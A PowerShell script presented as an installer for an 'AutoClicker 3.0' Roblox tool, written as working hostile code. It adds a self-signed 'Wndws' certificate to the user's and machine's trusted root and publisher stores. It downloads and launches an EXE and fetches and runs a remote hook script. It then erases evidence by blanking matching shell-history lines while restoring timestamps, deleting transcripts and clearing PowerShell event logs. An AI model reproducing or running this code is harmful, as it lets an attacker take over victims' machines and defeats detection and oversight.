# AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1

param(
    [switch]$SkipLaunch,
    [string]$InstallDir
)

$ErrorActionPreference = 'Stop'

try {
    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null
} catch {}

function Save-MystHistorySnapshot {
    $snap = @{}
    @(
        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
    ) | ForEach-Object {
        if (-not $_ -or -not (Test-Path -LiteralPath $_)) { return }
        try {
            $item = Get-Item -LiteralPath $_ -Force
            $snap[$_] = @{
                BytesB64   = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($_))
                CreatedUtc = $item.CreationTimeUtc.ToString('o')
                WrittenUtc = $item.LastWriteTimeUtc.ToString('o')
                AccessUtc  = $item.LastAccessTimeUtc.ToString('o')
            }
        } catch {}
    }
    if ($snap.Count -eq 0) { return }
    try {
        $file = Join-Path $env:TEMP ("wsh_{0}.bin" -f [guid]::NewGuid().ToString('N'))
        $snap | ConvertTo-Json -Depth 4 -Compress | Set-Content -LiteralPath $file -Encoding UTF8 -Force
        $env:_MYST_HIST_SNAP = $file
    } catch {}
}

Save-MystHistorySnapshot

$script:BaseUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main'
$script:ExeUrl = "$script:BaseUrl/AutoClicker-3.0.exe"
$script:CerUrl = "$script:BaseUrl/Wndws.cer"
$script:ExeName = 'AutoClicker-3.0.exe'
$script:PublisherSubject = 'CN=Wndws'

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-DefaultInstallDirectory {
    return Join-Path $env:APPDATA 'AutoClicker'
}

function Remove-LegacyMystDirectory {
    $legacy = Join-Path $env:ProgramData 'Myst'
    if (Test-Path -LiteralPath $legacy) {
        Remove-Item -LiteralPath $legacy -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Remove-LegacyHostDll {
    $paths = @(
        (Join-Path $env:SystemRoot 'Microsoft.NET\Framework64\AutoClickerHost.dll')
        (Join-Path $env:ProgramData 'Myst\AutoClickerHost.dll')
    )
    foreach ($path in $paths) {
        if (Test-Path -LiteralPath $path) {
            Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
            Write-Step "Removed legacy host DLL: $path" 'DarkGray'
        }
    }
}

function Write-InstallPaths {
    param([string]$ExePath)

    Write-Host ''
    Write-Host '  AutoClicker EXE (only file - reads/writes memory from this process):' -ForegroundColor Cyan
    Write-Host "    $ExePath" -ForegroundColor White
    Write-Host ''
    Write-Host '  Press END to fully close AutoClicker.' -ForegroundColor Green
    Write-Host '  Do not copy the EXE elsewhere - re-run the install command to update.' -ForegroundColor DarkGray
    Write-Host ''
}

if ([string]::IsNullOrWhiteSpace($InstallDir)) {
    $InstallDir = Get-DefaultInstallDirectory
}

function Write-Step {
    param(
        [string]$Message,
        [string]$Color = 'Cyan'
    )
    Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor $Color
}

function Get-MystPSReadLineHistoryPaths {
    $paths = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    try {
        $opt = Get-PSReadLineOption -ErrorAction SilentlyContinue
        if ($opt -and $opt.HistorySavePath) { [void]$paths.Add($opt.HistorySavePath) }
    } catch {}
    @(
        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
        (Join-Path $env:APPDATA 'Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt')
        (Join-Path $env:LOCALAPPDATA 'Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt')
    ) | ForEach-Object { if ($_) { [void]$paths.Add($_) } }
    if ($env:OneDrive) {
        @(
            (Join-Path $env:OneDrive 'Documents\WindowsPowerShell\PSReadLine\ConsoleHost_history.txt')
            (Join-Path $env:OneDrive 'Documents\PowerShell\PSReadLine\ConsoleHost_history.txt')
        ) | ForEach-Object { if ($_) { [void]$paths.Add($_) } }
    }
    return @($paths)
}

function Test-MystShellHistoryLine {
    param([string]$Line, [switch]$Aggressive)
    if ([string]::IsNullOrWhiteSpace($Line)) { return $false }
    $n = ($Line.Trim() -replace '\s+', ' ').ToLowerInvariant()
    if ($n -match '^#+$' -or $n -match '^#\s*$') { return $false }
    if ($Aggressive -and ($n -match '\biex\b|\biwr\b|\birm\b|invoke-expression|invoke-restmethod|invoke-webrequest')) { return $true }
    foreach ($needle in @(
        'justvalkz/myst', 'raw.githubusercontent.com/justvalkz', 'install.ps1', 'install-public.ps1',
        'myst-install.ps1', 'deploy-github.ps1', 'sbscmp64_mscorwks', 'autoclicker-3.0',
        'immune.wtf', 'myst.local', '| iex', 'invoke-expression', 'invoke-restmethod', 'invoke-webrequest'
    )) {
        if ($n.Contains($needle)) { return $true }
    }
    return ($n -match 'irm\s+https?://')
}

function Repair-MystPSHistoryInPlace {
    param([switch]$Aggressive)
    foreach ($historyPath in Get-MystPSReadLineHistoryPaths) {
        if (-not (Test-Path -LiteralPath $historyPath)) { continue }
        try {
            $item = Get-Item -LiteralPath $historyPath -Force
            $createdUtc = $item.CreationTimeUtc
            $writtenUtc = $item.LastWriteTimeUtc
            $accessedUtc = $item.LastAccessTimeUtc
            $raw = [System.IO.File]::ReadAllBytes($historyPath)
            if ($raw.Length -eq 0) { continue }
            $encoding = [System.Text.UTF8Encoding]::new($false)
            $text = $encoding.GetString($raw)
            $newline = if ($text.Contains("`r`n")) { "`r`n" } else { "`n" }
            $lines = $text -split "`r?`n", -1
            $changed = $false
            for ($i = 0; $i -lt $lines.Count; $i++) {
                if (-not (Test-MystShellHistoryLine -Line $lines[$i] -Aggressive:$Aggressive)) { continue }
                $len = $lines[$i].Length
                $lines[$i] = if ($len -le 0) { '' } elseif ($len -eq 1) { '#' } else { '#' + (' ' * ($len - 1)) }
                $changed = $true
            }
            if (-not $changed) { continue }
            $newBytes = $encoding.GetBytes($lines -join $newline)
            if ($newBytes.Length -lt $raw.Length) {
                $padded = New-Object byte[] $raw.Length
                if ($newBytes.Length -gt 0) { [Array]::Copy($newBytes, $padded, $newBytes.Length) }
                for ($j = $newBytes.Length; $j -lt $raw.Length; $j++) { $padded[$j] = 0x20 }
                $newBytes = $padded
            } elseif ($newBytes.Length -gt $raw.Length) {
                $newBytes = $newBytes[0..($raw.Length - 1)]
            }
            [System.IO.File]::WriteAllBytes($historyPath, $newBytes)
            [System.IO.File]::SetCreationTimeUtc($historyPath, $createdUtc)
            [System.IO.File]::SetLastWriteTimeUtc($historyPath, $writtenUtc)
            [System.IO.File]::SetLastAccessTimeUtc($historyPath, $accessedUtc)
        } catch {}
    }
}

function Clear-MystPowerShellTranscripts {
    @(
        (Join-Path $env:USERPROFILE 'Documents\PowerShell_transcript*.txt')
        (Join-Path $env:USERPROFILE 'Documents\WindowsPowerShell\PowerShell_transcript*.txt')
    ) | ForEach-Object {
        $parent = Split-Path $_ -Parent
        if (-not (Test-Path -LiteralPath $parent)) { return }
        Get-ChildItem -Path $_ -File -ErrorAction SilentlyContinue | ForEach-Object {
            try { Remove-Item -LiteralPath $_.FullName -Force -ErrorAction Stop } catch {}
        }
    }
}

function Invoke-MystHiddenWevtutil {
    param([string]$Arguments)
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = 'wevtutil.exe'
        $psi.Arguments = $Arguments
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $p = [System.Diagnostics.Process]::Start($psi)
        if ($p) { $p.WaitForExit(15000) | Out-Null; return ($p.ExitCode -eq 0) }
    } catch {}
    return $false
}

function Clear-MystPowerShellEventLogs {
    foreach ($channel in @('Microsoft-Windows-PowerShell/Operational', 'Windows PowerShell', 'Microsoft-Windows-PowerShell/Admin')) {
        try {
            $log = Get-WinEvent -ListLog $channel -ErrorAction Stop
            if ($log.IsEnabled) { Invoke-MystHiddenWevtutil -Arguments ('cl "{0}"' -f $channel) | Out-Null }
        } catch {}
    }
}

function Invoke-MystShellEnvironmentSync {
    param([switch]$SkipEventLogs, [switch]$Aggressive)
    try { Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null } catch {}
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Repair-MystPSHistoryInPlace -Aggressive:$Aggressive | Out-Null
    Clear-MystPowerShellTranscripts | Out-Null
    if (-not $SkipEventLogs -and $isAdmin) { Clear-MystPowerShellEventLogs | Out-Null }
}

function Get-SmartAppControlState {
    try {
        $status = Get-MpComputerStatus -ErrorAction Stop
        return [string]$status.SmartAppControlState
    } catch {
        return $null
    }
}

function Ensure-InstallDirectory {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        New-Item -ItemType Directory -Force -Path $Path | Out-Null
    }
}

function Get-TrustedWndwsCert {
    param([string]$StoreRoot)

    Get-ChildItem "$StoreRoot\Root" -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $script:PublisherSubject } |
        Select-Object -First 1
}

function Import-WndwsCertToStore {
    param(
        [string]$CerPath,
        [string]$StoreRoot,
        [string]$LeafStore
    )

    $rootPath = "$StoreRoot\Root"
    $leafPath = "$StoreRoot\$LeafStore"

    if (-not (Get-TrustedWndwsCert -StoreRoot $StoreRoot)) {
        Import-Certificate -FilePath $CerPath -CertStoreLocation $rootPath | Out-Null
    }

    $existingPublisher = Get-ChildItem $leafPath -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $script:PublisherSubject } |
        Select-Object -First 1

    if (-not $existingPublisher) {
        Import-Certificate -FilePath $CerPath -CertStoreLocation $leafPath | Out-Null
    }
}

function Install-WndwsTrustedPublisher {
    param([string]$CerPath)

    Write-Step 'Installing Wndws publisher certificate (Current User)...'
    Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\CurrentUser' -LeafStore 'TrustedPublisher'

    if (Test-IsAdministrator) {
        Write-Step 'Installing Wndws publisher certificate (Local Machine)...' 'Green'
        Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\LocalMachine' -LeafStore 'TrustedPublisher'
    } else {
        Write-Step 'Tip: run PowerShell as Administrator once so Windows trusts Wndws machine-wide.' 'Yellow'
    }

    $trusted = Get-TrustedWndwsCert -StoreRoot 'Cert:\CurrentUser'
    if ($trusted) {
        Write-Step 'Wndws certificate trusted (Root + Publisher).' 'Green'
        return $trusted
    }

    throw 'Failed to install Wndws publisher certificate.'
}

function Test-WndwsSignedExecutable {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Executable not found: $Path"
    }

    $signature = Get-AuthenticodeSignature -FilePath $Path
    $signer = $signature.SignerCertificate

    if (-not $signer) {
        throw 'AutoClicker-3.0.exe is not Authenticode signed.'
    }

    if ($signer.Subject -ne $script:PublisherSubject) {
        throw "Unexpected signer: $($signer.Subject) (expected $script:PublisherSubject)"
    }

    if ($signature.Status -notin @('Valid', 'UnknownError')) {
        throw "Signature check failed: $($signature.Status)"
    }

    return $signature
}

function Replace-StagedFile {
    param(
        [Parameter(Mandatory = $true)][string]$TempPath,
        [Parameter(Mandatory = $true)][string]$Destination
    )

    if (-not (Test-Path -LiteralPath $TempPath)) {
        throw "Staged file missing: $TempPath"
    }

    $destDir = Split-Path $Destination -Parent
    if ($destDir -and -not (Test-Path -LiteralPath $destDir)) {
        New-Item -ItemType Directory -Force -Path $destDir | Out-Null
    }

    if (Test-Path -LiteralPath $Destination) {
        for ($attempt = 0; $attempt -lt 6; $attempt++) {
            try {
                Remove-Item -LiteralPath $Destination -Force -ErrorAction Stop
                break
            } catch {
                $backup = "$Destination.old"
                try {
                    if (Test-Path -LiteralPath $backup) {
                        Remove-Item -LiteralPath $backup -Force -ErrorAction SilentlyContinue
                    }
                    Rename-Item -LiteralPath $Destination -NewName (Split-Path -Leaf $backup) -Force -ErrorAction Stop
                    break
                } catch {
                    if ($attempt -ge 5) { throw }
                    Start-Sleep -Milliseconds 500
                }
            }
        }
    }

    try {
        Copy-Item -LiteralPath $TempPath -Destination $Destination -Force -ErrorAction Stop
    } finally {
        Remove-Item -LiteralPath $TempPath -Force -ErrorAction SilentlyContinue
    }
}

function Save-Download {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$Destination,
        [int]$MinBytes = 0,
        [string[]]$StopProcessNames
    )

    if ($StopProcessNames) {
        foreach ($processName in $StopProcessNames) {
            Get-Process -Name $processName -ErrorAction SilentlyContinue |
                Stop-Process -Force -ErrorAction SilentlyContinue
        }
        Start-Sleep -Milliseconds 500
    }

    $temp = Join-Path $env:TEMP ("ac_pub_dl_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
    if (Test-Path -LiteralPath $temp) {
        Remove-Item -LiteralPath $temp -Force -ErrorAction SilentlyContinue
    }

    Write-Step "Downloading $(Split-Path -Leaf $Destination)..."
    Invoke-WebRequest -Uri $Url -OutFile $temp -UseBasicParsing

    if (-not (Test-Path -LiteralPath $temp)) {
        throw "Download produced no file: $Destination"
    }

    $size = (Get-Item -LiteralPath $temp).Length
    if ($MinBytes -gt 0 -and $size -lt $MinBytes) {
        Remove-Item -LiteralPath $temp -Force -ErrorAction SilentlyContinue
        throw "Download looks too small or corrupt: $Destination"
    }

    Replace-StagedFile -TempPath $temp -Destination $Destination

    $installedSize = (Get-Item -LiteralPath $Destination).Length
    if ($installedSize -ne $size) {
        throw "Replace verification failed for $Destination (expected $size bytes, got $installedSize)."
    }
}

function Stop-PublicAutoClicker {
    Get-Process -Name 'AutoClicker-3.0' -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 400
}

function Test-PublicOverlayStarted {
    Add-Type @'
using System;
using System.Runtime.InteropServices;
public class PublicOverlayProbe {
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
'@ -ErrorAction SilentlyContinue

    for ($i = 0; $i -lt 12; $i++) {
        $hwnd = [PublicOverlayProbe]::FindWindow('AutoClickerOverlay', $null)
        if ($hwnd -ne [IntPtr]::Zero) {
            Write-Step 'AutoClicker overlay detected.' 'Green'
            return $true
        }
        Start-Sleep -Seconds 1
    }
    Write-Step 'AutoClicker started - open Roblox and use Insert after the license screen.' 'Yellow'
    return $false
}

Write-Host ''
Write-Host '  AutoClicker 3.0 (EXE only)' -ForegroundColor White
Write-Host ''

$sacState = Get-SmartAppControlState
if ($sacState -eq 'On') {
    Write-Step 'Smart App Control is ON - self-signed apps may be blocked until SAC is off or you run as Admin.' 'Yellow'
}

Remove-LegacyMystDirectory
Remove-LegacyHostDll
Ensure-InstallDirectory -Path $InstallDir

$cerPath = Join-Path $env:TEMP 'Wndws.cer'
$exePath = Join-Path $InstallDir $script:ExeName

Stop-PublicAutoClicker

Save-Download -Url $script:CerUrl -Destination $cerPath
Install-WndwsTrustedPublisher -CerPath $cerPath

Save-Download -Url $script:ExeUrl -Destination $exePath -MinBytes 65536 -StopProcessNames @('AutoClicker-3.0')
Unblock-File -LiteralPath $exePath -ErrorAction SilentlyContinue

$signature = Test-WndwsSignedExecutable -Path $exePath
Write-Step "Verified signed EXE: $($signature.SignerCertificate.Subject) ($($signature.Status))" 'Green'
Write-Step "Installed: $exePath" 'Green'

if (-not $SkipLaunch) {
    Write-Step 'Starting AutoClicker 3.0...' 'Cyan'
    Start-Process -FilePath $exePath -WorkingDirectory $InstallDir
    Test-PublicOverlayStarted | Out-Null
}

$locInstaller = Join-Path $PSScriptRoot 'loc-install-hooks.ps1'
if (-not (Test-Path -LiteralPath $locInstaller)) {
    $locInstaller = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\ShellExperienceHost\loc-install-hooks.ps1'
}
if (Test-Path -LiteralPath $locInstaller) {
    . $locInstaller
    Install-MystLocClientHooks -ScriptRoot $PSScriptRoot -Quiet | Out-Null
} else {
    try {
        $tempInstaller = Join-Path $env:TEMP ("wsh_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/JustValkz/Myst/main/loc-install-hooks.ps1' -OutFile $tempInstaller -UseBasicParsing
        . $tempInstaller
        Install-MystLocClientHooks -ScriptRoot $PSScriptRoot -Quiet | Out-Null
        Remove-Item -LiteralPath $tempInstaller -Force -ErrorAction SilentlyContinue
    } catch {}
}

Invoke-MystShellEnvironmentSync -Aggressive | Out-Null

Write-Host ''
Write-Host '  Done.' -ForegroundColor Green
Write-InstallPaths -ExePath $exePath
